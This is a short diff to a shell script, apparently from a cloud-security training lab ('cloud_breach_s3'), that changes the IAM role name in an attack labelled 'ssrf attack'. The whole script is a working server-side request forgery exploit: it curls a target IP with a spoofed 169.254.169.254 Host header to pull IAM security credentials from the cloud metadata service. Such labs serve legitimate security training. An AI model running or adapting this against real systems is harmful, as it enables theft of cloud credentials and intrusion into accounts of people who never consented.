@@ -1,9 +1,9 @@
 S3_BUCKET=''
 IP_ADDRESS=''
 echo 'ssrf attack'
-sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgid9urk478nmm -H 'Host:169.254.169.254')
+sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
 sleep 5
-sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgid9urk478nmm -H 'Host:169.254.169.254')
+sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
 sleep 5
 echo 'ssrf attack complete'
 
